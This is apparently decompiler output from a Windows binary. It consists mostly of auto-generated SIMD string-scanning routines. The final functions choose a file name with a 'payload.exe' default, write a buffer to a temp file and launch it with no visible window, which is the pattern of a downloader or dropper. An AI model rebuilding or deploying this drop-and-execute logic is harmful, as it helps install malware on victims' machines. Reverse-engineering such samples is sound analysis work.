        auVar13[9] = -(pcVar1[9] == '\0');
        auVar13[10] = -(pcVar1[10] == '\0');
        auVar13[0xb] = -(pcVar1[0xb] == '\0');
        auVar13[0xc] = -(pcVar1[0xc] == '\0');
        auVar13[0xd] = -(pcVar1[0xd] == '\0');
        auVar13[0xe] = -(pcVar1[0xe] == '\0');
        auVar13[0xf] = -(pcVar1[0xf] == '\0');
        if ((((((((((((((((SUB161(auVar13 >> 7,0) & 1) != 0 || (SUB161(auVar13 >> 0xf,0) & 1) != 0)
                        || (SUB161(auVar13 >> 0x17,0) & 1) != 0) ||
                       (SUB161(auVar13 >> 0x1f,0) & 1) != 0) || (SUB161(auVar13 >> 0x27,0) & 1) != 0
                      ) || (SUB161(auVar13 >> 0x2f,0) & 1) != 0) ||
                    (SUB161(auVar13 >> 0x37,0) & 1) != 0) || (SUB161(auVar13 >> 0x3f,0) & 1) != 0)
                  || (SUB161(auVar13 >> 0x47,0) & 1) != 0) || (SUB161(auVar13 >> 0x4f,0) & 1) != 0)
                || (SUB161(auVar13 >> 0x57,0) & 1) != 0) || (SUB161(auVar13 >> 0x5f,0) & 1) != 0) ||
              (SUB161(auVar13 >> 0x67,0) & 1) != 0) || (SUB161(auVar13 >> 0x6f,0) & 1) != 0) ||
            (SUB161(auVar13 >> 0x77,0) & 1) != 0) || auVar13[0xf] < '\0') {
          auVar21[0] = -(*pcVar1 == '\0');
          auVar21[1] = -(pcVar1[1] == '\0');
          auVar21[2] = -(pcVar1[2] == '\0');
          auVar21[3] = -(pcVar1[3] == '\0');
          auVar21[4] = -(pcVar1[4] == '\0');
          auVar21[5] = -(pcVar1[5] == '\0');
          auVar21[6] = -(pcVar1[6] == '\0');
          auVar21[7] = -(pcVar1[7] == '\0');
          auVar21[8] = -(pcVar1[8] == '\0');
          auVar21[9] = -(pcVar1[9] == '\0');
          auVar21[10] = -(pcVar1[10] == '\0');
          auVar21[0xb] = -(pcVar1[0xb] == '\0');
          auVar21[0xc] = -(pcVar1[0xc] == '\0');
          auVar21[0xd] = -(pcVar1[0xd] == '\0');
          auVar21[0xe] = -(pcVar1[0xe] == '\0');
          auVar21[0xf] = -(pcVar1[0xf] == '\0');
          auVar13 = auVar21 & _DAT_140017010 | ~auVar21 & _DAT_140017000;
          auVar34._0_8_ = auVar13._8_8_;
          auVar34._8_4_ = auVar13._8_4_;
          auVar34._12_4_ = auVar13._12_4_;
          auVar34 = auVar34 & _DAT_140017000;
          bVar9 = auVar13[0];
          bVar17 = auVar34[0];
          bVar25 = (bVar9 < bVar17) * bVar9 | (bVar9 >= bVar17) * bVar17;
          bVar9 = auVar13[1];
          bVar17 = auVar34[1];
          bVar38 = (bVar9 < bVar17) * bVar9 | (bVar9 >= bVar17) * bVar17;
          bVar9 = auVar13[2];
          bVar17 = auVar34[2];
          bVar40 = (bVar9 < bVar17) * bVar9 | (bVar9 >= bVar17) * bVar17;
          bVar9 = auVar13[3];
          bVar17 = auVar34[3];
          bVar43 = (bVar9 < bVar17) * bVar9 | (bVar9 >= bVar17) * bVar17;
          bVar9 = auVar13[4];
          bVar50 = auVar34[4];
          bVar17 = auVar13[5];
          bVar51 = auVar34[5];
          bVar19 = auVar13[6];
          bVar52 = auVar34[6];
          bVar20 = auVar13[7];
          bVar53 = auVar34[7];
          uVar4 = CONCAT13((bVar20 < bVar53) * bVar20 | (bVar20 >= bVar53) * bVar53,
                           CONCAT12((bVar19 < bVar52) * bVar19 | (bVar19 >= bVar52) * bVar52,
                                    CONCAT11((bVar17 < bVar51) * bVar17 |
                                             (bVar17 >= bVar51) * bVar51,
                                             (bVar9 < bVar50) * bVar9 | (bVar9 >= bVar50) * bVar50))
                          );
          bVar9 = auVar13[10];
          bVar17 = auVar34[10];
          bVar50 = (bVar9 < bVar17) * bVar9 | (bVar9 >= bVar17) * bVar17;
          bVar9 = auVar13[0xb];
          bVar17 = auVar34[0xb];
          bVar51 = (bVar9 < bVar17) * bVar9 | (bVar9 >= bVar17) * bVar17;
          bVar9 = auVar13[0xe];
          bVar17 = auVar34[0xe];
          bVar19 = auVar34[0xf];
          bVar52 = (bVar9 < bVar17) * bVar9 | (bVar9 >= bVar17) * bVar17;
          bVar9 = auVar13[0xf];
          bVar53 = (bVar9 < bVar19) * bVar9 | (bVar9 >= bVar19) * bVar19;
          auVar22._4_4_ = uVar4;
          auVar22._0_4_ = uVar4;
          auVar22._8_4_ = uVar4;
          auVar22._12_4_ = uVar4;
          auVar22 = auVar22 & _DAT_140017000;
          bVar9 = auVar22[0];
          bVar9 = (bVar25 < bVar9) * bVar25 | (bVar25 >= bVar9) * bVar9;
          bVar17 = auVar22[1];
          bVar17 = (bVar38 < bVar17) * bVar38 | (bVar38 >= bVar17) * bVar17;
          bVar19 = auVar22[2];
          bVar20 = auVar22[3];
          auVar35[1] = (bVar43 < bVar20) * bVar43 | (bVar43 >= bVar20) * bVar20;
          auVar35[0] = (bVar40 < bVar19) * bVar40 | (bVar40 >= bVar19) * bVar19;
          bVar19 = auVar22[10];
          bVar20 = auVar22[0xb];
          bVar25 = auVar22[0xe];
          bVar38 = auVar22[0xf];
          auVar35._2_6_ = 0;
          auVar35._8_4_ =
               (uint)(((uint5)CONCAT11((bVar51 < bVar20) * bVar51 | (bVar51 >= bVar20) * bVar20,
                                       (bVar50 < bVar19) * bVar50 | (bVar50 >= bVar19) * bVar19) <<
                      0x18) >> 0x18);
          auVar35._12_4_ =
               (uint)(((unkuint9)
                       CONCAT11((bVar53 < bVar38) * bVar53 | (bVar53 >= bVar38) * bVar38,
                                (bVar52 < bVar25) * bVar52 | (bVar52 >= bVar25) * bVar25) << 0x38)
                     >> 0x38);
          bVar19 = SUB161(auVar35 & _DAT_140017000,0);
          bVar9 = (bVar9 < bVar19) * bVar9 | (bVar9 >= bVar19) * bVar19;
          bVar19 = SUB161(auVar35 & _DAT_140017000,1);
          bVar10 = ((bVar17 < bVar19) * bVar17 | (bVar17 >= bVar19) * bVar19) & bVar10;
          uVar5 = (byte)((bVar9 < bVar10) * bVar9 | (bVar9 >= bVar10) * bVar10) + uVar7;
          goto LAB_1400068c4;
        }
        pcVar1 = (char *)(param_2 + 0x10 + uVar7);
        auVar29[0] = -(*pcVar1 == '\0');
        auVar29[1] = -(pcVar1[1] == '\0');
        auVar29[2] = -(pcVar1[2] == '\0');
        auVar29[3] = -(pcVar1[3] == '\0');
        auVar29[4] = -(pcVar1[4] == '\0');
        auVar29[5] = -(pcVar1[5] == '\0');
        auVar29[6] = -(pcVar1[6] == '\0');
        auVar29[7] = -(pcVar1[7] == '\0');
        auVar29[8] = -(pcVar1[8] == '\0');
        auVar29[9] = -(pcVar1[9] == '\0');
        auVar29[10] = -(pcVar1[10] == '\0');
        auVar29[0xb] = -(pcVar1[0xb] == '\0');
        auVar29[0xc] = -(pcVar1[0xc] == '\0');
        auVar29[0xd] = -(pcVar1[0xd] == '\0');
        auVar29[0xe] = -(pcVar1[0xe] == '\0');
        auVar29[0xf] = -(pcVar1[0xf] == '\0');
        if ((((((((((((((((SUB161(auVar29 >> 7,0) & 1) != 0 || (SUB161(auVar29 >> 0xf,0) & 1) != 0)
                        || (SUB161(auVar29 >> 0x17,0) & 1) != 0) ||
                       (SUB161(auVar29 >> 0x1f,0) & 1) != 0) || (SUB161(auVar29 >> 0x27,0) & 1) != 0
                      ) || (SUB161(auVar29 >> 0x2f,0) & 1) != 0) ||
                    (SUB161(auVar29 >> 0x37,0) & 1) != 0) || (SUB161(auVar29 >> 0x3f,0) & 1) != 0)
                  || (SUB161(auVar29 >> 0x47,0) & 1) != 0) || (SUB161(auVar29 >> 0x4f,0) & 1) != 0)
                || (SUB161(auVar29 >> 0x57,0) & 1) != 0) || (SUB161(auVar29 >> 0x5f,0) & 1) != 0) ||
              (SUB161(auVar29 >> 0x67,0) & 1) != 0) || (SUB161(auVar29 >> 0x6f,0) & 1) != 0) ||
            (SUB161(auVar29 >> 0x77,0) & 1) != 0) || auVar29[0xf] < '\0') {
          auVar23[0] = -(*pcVar1 == '\0');
          auVar23[1] = -(pcVar1[1] == '\0');
          auVar23[2] = -(pcVar1[2] == '\0');
          auVar23[3] = -(pcVar1[3] == '\0');
          auVar23[4] = -(pcVar1[4] == '\0');
          auVar23[5] = -(pcVar1[5] == '\0');
          auVar23[6] = -(pcVar1[6] == '\0');
          auVar23[7] = -(pcVar1[7] == '\0');
          auVar23[8] = -(pcVar1[8] == '\0');
          auVar23[9] = -(pcVar1[9] == '\0');
          auVar23[10] = -(pcVar1[10] == '\0');
          auVar23[0xb] = -(pcVar1[0xb] == '\0');
          auVar23[0xc] = -(pcVar1[0xc] == '\0');
          auVar23[0xd] = -(pcVar1[0xd] == '\0');
          auVar23[0xe] = -(pcVar1[0xe] == '\0');
          auVar23[0xf] = -(pcVar1[0xf] == '\0');
          auVar13 = auVar23 & _DAT_140017010 | ~auVar23 & _DAT_140017000;
          auVar36._0_8_ = auVar13._8_8_;
          auVar36._8_4_ = auVar13._8_4_;
          auVar36._12_4_ = auVar13._12_4_;
          auVar36 = auVar36 & _DAT_140017000;
          bVar9 = auVar13[0];
          bVar17 = auVar36[0];
          bVar25 = (bVar9 < bVar17) * bVar9 | (bVar9 >= bVar17) * bVar17;
          bVar9 = auVar13[1];
          bVar17 = auVar36[1];
          bVar38 = (bVar9 < bVar17) * bVar9 | (bVar9 >= bVar17) * bVar17;
          bVar9 = auVar13[2];
          bVar17 = auVar36[2];
          bVar40 = (bVar9 < bVar17) * bVar9 | (bVar9 >= bVar17) * bVar17;
          bVar9 = auVar13[3];
          bVar17 = auVar36[3];
          bVar43 = (bVar9 < bVar17) * bVar9 | (bVar9 >= bVar17) * bVar17;
          bVar9 = auVar13[4];
          bVar50 = auVar36[4];
          bVar17 = auVar13[5];
          bVar51 = auVar36[5];
          bVar19 = auVar13[6];
          bVar52 = auVar36[6];
          bVar20 = auVar13[7];
          bVar53 = auVar36[7];
          uVar4 = CONCAT13((bVar20 < bVar53) * bVar20 | (bVar20 >= bVar53) * bVar53,
                           CONCAT12((bVar19 < bVar52) * bVar19 | (bVar19 >= bVar52) * bVar52,
                                    CONCAT11((bVar17 < bVar51) * bVar17 |
                                             (bVar17 >= bVar51) * bVar51,
                                             (bVar9 < bVar50) * bVar9 | (bVar9 >= bVar50) * bVar50))
                          );
          bVar9 = auVar13[10];
          bVar17 = auVar36[10];
          bVar50 = (bVar9 < bVar17) * bVar9 | (bVar9 >= bVar17) * bVar17;
          bVar9 = auVar13[0xb];
          bVar17 = auVar36[0xb];
          bVar51 = (bVar9 < bVar17) * bVar9 | (bVar9 >= bVar17) * bVar17;
          bVar9 = auVar13[0xe];
          bVar17 = auVar36[0xe];
          bVar19 = auVar36[0xf];
          bVar52 = (bVar9 < bVar17) * bVar9 | (bVar9 >= bVar17) * bVar17;
          bVar9 = auVar13[0xf];
          bVar53 = (bVar9 < bVar19) * bVar9 | (bVar9 >= bVar19) * bVar19;
          auVar24._4_4_ = uVar4;
          auVar24._0_4_ = uVar4;
          auVar24._8_4_ = uVar4;
          auVar24._12_4_ = uVar4;
          auVar24 = auVar24 & _DAT_140017000;
          bVar9 = auVar24[0];
          bVar9 = (bVar25 < bVar9) * bVar25 | (bVar25 >= bVar9) * bVar9;
          bVar17 = auVar24[1];
          bVar17 = (bVar38 < bVar17) * bVar38 | (bVar38 >= bVar17) * bVar17;
          bVar19 = auVar24[2];
          bVar20 = auVar24[3];
          auVar37[1] = (bVar43 < bVar20) * bVar43 | (bVar43 >= bVar20) * bVar20;
          auVar37[0] = (bVar40 < bVar19) * bVar40 | (bVar40 >= bVar19) * bVar19;
          bVar19 = auVar24[10];
          bVar20 = auVar24[0xb];
          bVar25 = auVar24[0xe];
          bVar38 = auVar24[0xf];
          auVar37._2_6_ = 0;
          auVar37._8_4_ =
               (uint)(((uint5)CONCAT11((bVar51 < bVar20) * bVar51 | (bVar51 >= bVar20) * bVar20,
                                       (bVar50 < bVar19) * bVar50 | (bVar50 >= bVar19) * bVar19) <<
                      0x18) >> 0x18);
          auVar37._12_4_ =
               (uint)(((unkuint9)
                       CONCAT11((bVar53 < bVar38) * bVar53 | (bVar53 >= bVar38) * bVar38,
                                (bVar52 < bVar25) * bVar52 | (bVar52 >= bVar25) * bVar25) << 0x38)
                     >> 0x38);
          bVar19 = SUB161(auVar37 & _DAT_140017000,0);
          bVar9 = (bVar9 < bVar19) * bVar9 | (bVar9 >= bVar19) * bVar19;
          bVar19 = SUB161(auVar37 & _DAT_140017000,1);
          bVar10 = ((bVar17 < bVar19) * bVar17 | (bVar17 >= bVar19) * bVar19) & bVar10;
          uVar5 = (byte)((bVar9 < bVar10) * bVar9 | (bVar9 >= bVar10) * bVar10) + uVar7 + 0x10;
          goto LAB_1400068c4;
        }
        uVar5 = uVar7 + 0x20;
        uVar8 = uVar7 + 0x40;
        uVar7 = uVar5;
      } while (uVar8 < param_3);
    }
    uVar7 = uVar5;
    if (uVar5 + 0x10 < param_3) {
      pcVar1 = (char *)(param_2 + uVar5);
      auVar18 = SUB1615((undefined1  [16])0x0,1);
      auVar12[0] = -(*pcVar1 == '\0');
      auVar12[1] = -(pcVar1[1] == '\0');
      auVar12[2] = -(pcVar1[2] == '\0');
      auVar12[3] = -(pcVar1[3] == '\0');
      auVar12[4] = -(pcVar1[4] == '\0');
      auVar12[5] = -(pcVar1[5] == '\0');
      auVar12[6] = -(pcVar1[6] == '\0');
      auVar12[7] = -(pcVar1[7] == '\0');
      auVar12[8] = -(pcVar1[8] == '\0');
      auVar12[9] = -(auVar18[8] == pcVar1[9]);
      auVar12[10] = -(auVar18[9] == pcVar1[10]);
      auVar12[0xb] = -(auVar18[10] == pcVar1[0xb]);
      auVar12[0xc] = -(auVar18[0xb] == pcVar1[0xc]);
      auVar12[0xd] = -(auVar18[0xc] == pcVar1[0xd]);
      auVar12[0xe] = -(auVar18[0xd] == pcVar1[0xe]);
      auVar12[0xf] = -(auVar18[0xe] == pcVar1[0xf]);
      uVar7 = uVar5 + 0x10;
      if ((((((((((((((((SUB161(auVar12 >> 7,0) & 1) != 0 || (SUB161(auVar12 >> 0xf,0) & 1) != 0) ||
                      (SUB161(auVar12 >> 0x17,0) & 1) != 0) || (SUB161(auVar12 >> 0x1f,0) & 1) != 0)
                    || (SUB161(auVar12 >> 0x27,0) & 1) != 0) || (SUB161(auVar12 >> 0x2f,0) & 1) != 0
                   ) || (SUB161(auVar12 >> 0x37,0) & 1) != 0) ||
                 (SUB161(auVar12 >> 0x3f,0) & 1) != 0) || (SUB161(auVar12 >> 0x47,0) & 1) != 0) ||
               (SUB161(auVar12 >> 0x4f,0) & 1) != 0) || (SUB161(auVar12 >> 0x57,0) & 1) != 0) ||
             (SUB161(auVar12 >> 0x5f,0) & 1) != 0) || (SUB161(auVar12 >> 0x67,0) & 1) != 0) ||
           (SUB161(auVar12 >> 0x6f,0) & 1) != 0) || (SUB161(auVar12 >> 0x77,0) & 1) != 0) ||
          auVar12[0xf] < '\0') {
        auVar13 = auVar12 & _DAT_140017010 | ~auVar12 & _DAT_140017000;
        auVar30._0_8_ = auVar13._8_8_;
        auVar30._8_4_ = auVar13._8_4_;
        auVar30._12_4_ = auVar13._12_4_;
        auVar30 = auVar30 & _DAT_140017000;
        bVar9 = auVar13[0];
        bVar17 = auVar30[0];
        bVar25 = (bVar9 < bVar17) * bVar9 | (bVar9 >= bVar17) * bVar17;
        bVar9 = auVar13[1];
        bVar17 = auVar30[1];
        bVar38 = (bVar9 < bVar17) * bVar9 | (bVar9 >= bVar17) * bVar17;
        bVar9 = auVar13[2];
        bVar17 = auVar30[2];
        bVar40 = (bVar9 < bVar17) * bVar9 | (bVar9 >= bVar17) * bVar17;
        bVar9 = auVar13[3];
        bVar17 = auVar30[3];
        bVar43 = (bVar9 < bVar17) * bVar9 | (bVar9 >= bVar17) * bVar17;
        bVar9 = auVar13[4];
        bVar50 = auVar30[4];
        bVar17 = auVar13[5];
        bVar51 = auVar30[5];
        bVar19 = auVar13[6];
        bVar52 = auVar30[6];
        bVar20 = auVar13[7];
        bVar53 = auVar30[7];
        uVar4 = CONCAT13((bVar20 < bVar53) * bVar20 | (bVar20 >= bVar53) * bVar53,
                         CONCAT12((bVar19 < bVar52) * bVar19 | (bVar19 >= bVar52) * bVar52,
                                  CONCAT11((bVar17 < bVar51) * bVar17 | (bVar17 >= bVar51) * bVar51,
                                           (bVar9 < bVar50) * bVar9 | (bVar9 >= bVar50) * bVar50)));
        bVar9 = auVar13[10];
        bVar17 = auVar30[10];
        bVar50 = (bVar9 < bVar17) * bVar9 | (bVar9 >= bVar17) * bVar17;
        bVar9 = auVar13[0xb];
        bVar17 = auVar30[0xb];
        bVar51 = (bVar9 < bVar17) * bVar9 | (bVar9 >= bVar17) * bVar17;
        bVar9 = auVar13[0xe];
        bVar17 = auVar30[0xe];
        bVar19 = auVar30[0xf];
        bVar52 = (bVar9 < bVar17) * bVar9 | (bVar9 >= bVar17) * bVar17;
        bVar9 = auVar13[0xf];
        bVar53 = (bVar9 < bVar19) * bVar9 | (bVar9 >= bVar19) * bVar19;
        auVar14._4_4_ = uVar4;
        auVar14._0_4_ = uVar4;
        auVar14._8_4_ = uVar4;
        auVar14._12_4_ = uVar4;
        auVar14 = auVar14 & _DAT_140017000;
        bVar9 = auVar14[0];
        bVar9 = (bVar25 < bVar9) * bVar25 | (bVar25 >= bVar9) * bVar9;
        bVar17 = auVar14[1];
        bVar17 = (bVar38 < bVar17) * bVar38 | (bVar38 >= bVar17) * bVar17;
        bVar19 = auVar14[2];
        bVar20 = auVar14[3];
        auVar31[1] = (bVar43 < bVar20) * bVar43 | (bVar43 >= bVar20) * bVar20;
        auVar31[0] = (bVar40 < bVar19) * bVar40 | (bVar40 >= bVar19) * bVar19;
        bVar19 = auVar14[10];
        bVar20 = auVar14[0xb];
        bVar25 = auVar14[0xe];
        bVar38 = auVar14[0xf];
        auVar31._2_6_ = 0;
        auVar31._8_4_ =
             (uint)(((uint5)CONCAT11((bVar51 < bVar20) * bVar51 | (bVar51 >= bVar20) * bVar20,
                                     (bVar50 < bVar19) * bVar50 | (bVar50 >= bVar19) * bVar19) <<
                    0x18) >> 0x18);
        auVar31._12_4_ =
             (uint)(((unkuint9)
                     CONCAT11((bVar53 < bVar38) * bVar53 | (bVar53 >= bVar38) * bVar38,
                              (bVar52 < bVar25) * bVar52 | (bVar52 >= bVar25) * bVar25) << 0x38) >>
                   0x38);
        bVar19 = SUB161(auVar31 & _DAT_140017000,0);
        bVar9 = (bVar9 < bVar19) * bVar9 | (bVar9 >= bVar19) * bVar19;
        bVar19 = SUB161(auVar31 & _DAT_140017000,1);
        bVar10 = ((bVar17 < bVar19) * bVar17 | (bVar17 >= bVar19) * bVar19) & bVar10;
        uVar5 = uVar5 + (byte)((bVar9 < bVar10) * bVar9 | (bVar9 >= bVar10) * bVar10);
LAB_1400068c4:
        uVar6 = 1;
        goto LAB_1400068c6;
      }
    }
    uVar5 = uVar7;
    if (uVar7 + 8 < param_3) {
      uVar2 = *(undefined8 *)(param_2 + uVar7);
      cVar26 = (char)uVar2;
      auVar32[0] = -(cVar26 == '\0');
      cVar39 = (char)((ulonglong)uVar2 >> 8);
      auVar32[1] = -(cVar39 == '\0');
      cVar41 = (char)((ulonglong)uVar2 >> 0x10);
      auVar32[2] = -(cVar41 == '\0');
      cVar44 = (char)((ulonglong)uVar2 >> 0x18);
      auVar32[3] = -(cVar44 == '\0');
      cVar45 = (char)((ulonglong)uVar2 >> 0x20);
      auVar32[4] = -(cVar45 == '\0');
      cVar47 = (char)((ulonglong)uVar2 >> 0x28);
      auVar32[5] = -(cVar47 == '\0');
      cVar48 = (char)((ulonglong)uVar2 >> 0x30);
      cVar3 = (char)((ulonglong)uVar2 >> 0x38);
      auVar32[6] = -(cVar48 == '\0');
      auVar32[7] = -(cVar3 == '\0');
      auVar32[8] = 0xff;
      auVar32[9] = 0xff;
      auVar32[10] = 0xff;
      auVar32[0xb] = 0xff;
      auVar32[0xc] = 0xff;
      auVar32[0xd] = 0xff;
      auVar32[0xe] = 0xff;
      auVar32[0xf] = 0xff;
      uVar5 = uVar7 + 8;
      if ((((((((SUB161(auVar32 >> 7,0) & 1) != 0 || (SUB161(auVar32 >> 0xf,0) & 1) != 0) ||
              (SUB161(auVar32 >> 0x17,0) & 1) != 0) || (SUB161(auVar32 >> 0x1f,0) & 1) != 0) ||
            (SUB161(auVar32 >> 0x27,0) & 1) != 0) || (SUB161(auVar32 >> 0x2f,0) & 1) != 0) ||
          (SUB161(auVar32 >> 0x37,0) & 1) != 0) || (SUB161(auVar32 >> 0x3f,0) & 1) != 0) {
        auVar15[0] = -(cVar26 == '\0');
        auVar15[1] = -(cVar26 == '\0');
        auVar15[2] = -(cVar39 == '\0');
        auVar15[3] = -(cVar39 == '\0');
        auVar15[4] = -(cVar41 == '\0');
        auVar15[5] = -(cVar41 == '\0');
        auVar15[6] = -(cVar44 == '\0');
        auVar15[7] = -(cVar44 == '\0');
        auVar15[8] = -(cVar45 == '\0');
        auVar15[9] = -(cVar45 == '\0');
        auVar15[10] = -(cVar47 == '\0');
        auVar15[0xb] = -(cVar47 == '\0');
        auVar15[0xc] = -(cVar48 == '\0');
        auVar15[0xd] = -(cVar48 == '\0');
        auVar15[0xe] = -(cVar3 == '\0');
        auVar15[0xf] = -(cVar3 == '\0');
        auVar13 = auVar15 & _DAT_140017030 | ~auVar15 & _DAT_140017020;
        auVar33._0_8_ = auVar13._8_8_;
        auVar33._8_4_ = auVar13._8_4_;
        auVar33._12_4_ = auVar13._12_4_;
        auVar33 = auVar33 & _DAT_140017020;
        sVar11 = auVar13._0_2_;
        sVar28 = auVar33._0_2_;
        uVar27 = (ushort)(sVar11 < sVar28) * sVar11 | (ushort)(sVar11 >= sVar28) * sVar28;
        sVar11 = auVar13._2_2_;
        sVar28 = auVar33._2_2_;
        uVar42 = (ushort)(sVar11 < sVar28) * sVar11 | (ushort)(sVar11 >= sVar28) * sVar28;
        sVar11 = auVar13._4_2_;
        sVar46 = auVar33._4_2_;
        sVar28 = auVar13._6_2_;
        sVar49 = auVar33._6_2_;
        uVar4 = CONCAT22((ushort)(sVar28 < sVar49) * sVar28 | (ushort)(sVar28 >= sVar49) * sVar49,
                         (ushort)(sVar11 < sVar46) * sVar11 | (ushort)(sVar11 >= sVar46) * sVar46);
        auVar16._4_4_ = uVar4;
        auVar16._0_4_ = uVar4;
        auVar16._8_4_ = uVar4;
        auVar16._12_4_ = uVar4;
        sVar11 = SUB162(auVar16 & _DAT_140017020,0);
        uVar27 = ((short)uVar27 < sVar11) * uVar27 | (ushort)((short)uVar27 >= sVar11) * sVar11;
        sVar11 = SUB162(auVar16 & _DAT_140017020,2);
        uVar42 = (((short)uVar42 < sVar11) * uVar42 | (ushort)((short)uVar42 >= sVar11) * sVar11) &
                 (ushort)DAT_140017020;
        uVar5 = uVar7 + ((ushort)(((short)uVar27 < (short)uVar42) * uVar27 |
                                 ((short)uVar27 >= (short)uVar42) * uVar42) & 7);
        uVar6 = 1;
        goto LAB_1400068c6;
      }
    }
    for (; param_3 != uVar5; uVar5 = uVar5 + 1) {
      if (*(char *)(param_2 + uVar5) == '\0') goto LAB_1400068c4;
    }
  }
  uStack_10 = 0;
  local_14 = 0;
  uVar5 = 0;
  uVar6 = 0;
LAB_1400068c6:
  *param_1 = uVar5;
  *(undefined1 *)(param_1 + 1) = uVar6;
  *(undefined4 *)((longlong)param_1 + 9) = local_14;
  *(uint *)((longlong)param_1 + 0xc) = CONCAT31(uStack_10,local_14._3_1_);
  return;
}


// ==== FUN_1400068de @ 1400068de size 65

undefined4 FUN_1400068de(undefined4 param_1)

{
  undefined4 local_14;
  
  FUN_140005e23((undefined1 *)&local_14,0x1400193c0,(byte)param_1,(byte)((uint)param_1 >> 8),
                (byte)((uint)param_1 >> 0x10),(byte)((uint)param_1 >> 0x18));
  return local_14;
}


// ==== FUN_14000691f @ 14000691f size 58

ulonglong FUN_14000691f(void)

{
  ulonglong uVar1;
  ulonglong local_28;
  char local_20;
  
  FUN_14000662b(&local_28,0x140034aa4,0x20);
  uVar1 = 0x20;
  if (local_20 != '\0') {
    uVar1 = local_28;
  }
  return uVar1;
}


// ==== FUN_140006959 @ 140006959 size 177

undefined8 * FUN_140006959(undefined8 *param_1,undefined8 param_2,longlong *param_3)

{
  longlong lVar1;
  ulonglong uVar2;
  short sVar3;
  undefined **local_40;
  undefined8 local_38;
  undefined8 local_30;
  longlong local_28;
  
  local_40 = &PTR_FUN_140017348;
  local_30 = 0x104;
  local_28 = 0;
  lVar1 = param_3[2];
  uVar2 = param_3[3];
  local_38 = param_2;
  sVar3 = FUN_1400055ea(&local_40,*param_3,param_3[1],0x140017320);
  if (((sVar3 == 0) && (sVar3 = FUN_1400055ea(&local_40,lVar1,uVar2,0x140017320), sVar3 == 0)) &&
     (sVar3 = FUN_14000541c(&local_40,0x1400194e0,1), sVar3 == 0)) {
    *(undefined2 *)(param_1 + 2) = 0;
    *param_1 = local_38;
    param_1[1] = local_28 + -1;
    return param_1;
  }
  *(undefined2 *)(param_1 + 2) = 3;
  return param_1;
}


// ==== FUN_140006a0a @ 140006a0a size 82

undefined1 FUN_140006a0a(longlong param_1,longlong param_2,longlong param_3,longlong param_4)

{
  byte *pbVar1;
  byte *pbVar2;
  longlong lVar3;
  
  if (param_2 == param_4) {
    lVar3 = 0;
    do {
      if (param_2 == lVar3) {
        return 1;
      }
      pbVar1 = (byte *)(param_1 + lVar3);
      pbVar2 = (byte *)(param_3 + lVar3);
      lVar3 = lVar3 + 1;
    } while ((byte)(((byte)(*pbVar1 + 0xbf) < 0x1a) << 5 | *pbVar1) ==
             (byte)(((byte)(*pbVar2 + 0xbf) < 0x1a) << 5 | *pbVar2));
  }
  return 0;
}


// ==== FUN_140006a5c @ 140006a5c size 152

char * FUN_140006a5c(longlong param_1,ulonglong param_2)

{
  char *pcVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  longlong local_40;
  char local_38;
  ulonglong local_30;
  char local_28;
  
  FUN_140006e17((longlong *)&local_30,param_1,param_2,0x1400194e2,2);
  if (local_28 != '\0') {
    param_2 = local_30;
  }
  do {
    uVar3 = param_2;
    if (uVar3 == 0) break;
    param_2 = uVar3 - 1;
  } while (*(char *)(param_1 + -1 + uVar3) == '/');
  FUN_140006d51(&local_40,param_1,uVar3,'/');
  uVar2 = 0;
  if (local_38 != '\0') {
    uVar2 = local_40 + 1;
  }
  pcVar1 = "payload.exe";
  if (uVar3 != uVar2) {
    pcVar1 = (char *)(uVar2 + param_1);
  }
  return pcVar1;
}


// ==== FUN_140006af4 @ 140006af4 size 605

void FUN_140006af4(longlong param_1,ulonglong param_2,LPCVOID param_3,ulonglong param_4)

{
  undefined1 *puVar1;
  byte bVar2;
  short sVar3;
  int iVar4;
  HANDLE hFile;
  longlong lVar5;
  ulonglong uVar6;
  undefined1 local_43c [292];
  undefined1 local_318 [260];
  CHAR local_214 [260];
  LPSTR local_110;
  ulonglong local_108;
  longlong local_100;
  ulonglong local_f8;
  LPCSTR local_f0 [2];
  short local_e0;
  HANDLE local_d8;
  HANDLE pvStack_d0;
  undefined8 local_c8;
  undefined **local_b8;
  undefined1 *puStack_b0;
  undefined8 local_a8;
  undefined8 uStack_a0;
  undefined8 local_98;
  undefined8 uStack_90;
  undefined8 local_88;
  undefined8 uStack_80;
  undefined8 local_78;
  undefined8 uStack_70;
  undefined8 local_68;
  undefined8 uStack_60;
  undefined8 local_58;
  DWORD local_44;
  
  uVar6 = param_2;
  local_110 = FUN_14000714e(local_214);
  local_108 = uVar6;
  local_100 = param_1;
  local_f8 = param_2;
  FUN_140006959(local_f0,local_318,(longlong *)&local_110);
  if ((local_e0 == 0) &&
     (hFile = CreateFileA(local_f0[0],0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0),
     hFile != (HANDLE)0xffffffffffffffff)) {
    local_44 = 0;
    uVar6 = 0;
    WriteFile(hFile,param_3,(DWORD)param_4,&local_44,(LPOVERLAPPED)0x0);
    CloseHandle(hFile);
    if (param_4 == local_44) {
      if (3 < param_2) {
        param_3 = (LPCVOID)0x4;
        bVar2 = FUN_140006a0a(param_1 + param_2 + -4,4,0x1400194f1,4);
        if ((bVar2 & 1) != 0) {
          FUN_140006d7c();
          return;
        }
      }
      lVar5 = FUN_1400053fc((longlong)local_f0[0]);
      local_b8 = &PTR_FUN_140017348;
      puStack_b0 = local_43c;
      local_a8 = 0x124;
      uStack_a0 = 0;
      sVar3 = FUN_14000541c(&local_b8,0x1400194f6,0x15);
      if ((sVar3 == 0) &&
         (sVar3 = FUN_1400055ea(&local_b8,lVar5,(ulonglong)param_3,0x140017320), sVar3 == 0)) {
        sVar3 = FUN_14000541c(&local_b8,0x14001950b,2);
        puVar1 = puStack_b0;
        if (sVar3 == 0) {
          puStack_b0 = (undefined1 *)0x0;
          local_88 = 0;
          local_a8 = 0;
          uStack_a0 = 0;
          local_98 = 0;
          uStack_90 = 0;
          local_78 = 0;
          uStack_70 = 0;
          local_58 = 0;
          local_68 = 0;
          uStack_60 = 0;
          local_b8 = (undefined **)0x68;
          uStack_80 = 0x100000000;
          local_d8 = (HANDLE)0x0;
          pvStack_d0 = (HANDLE)0x0;
          local_c8 = 0;
          iVar4 = (*DAT_1400340c0)(0,puVar1,0,0,uVar6 & 0xffffffff00000000,0x8000000,0,0,&local_b8,
                                   &local_d8);
          if (iVar4 != 0) {
            CloseHandle(pvStack_d0);
            CloseHandle(local_d8);
          }
        }
      }
    }
  }
  return;
}


// ==== FUN_140006d51 @ 140006d51 size 43

void FUN_140006d51(longlong *param_1,longlong param_2,longlong param_3,char param_4)

{
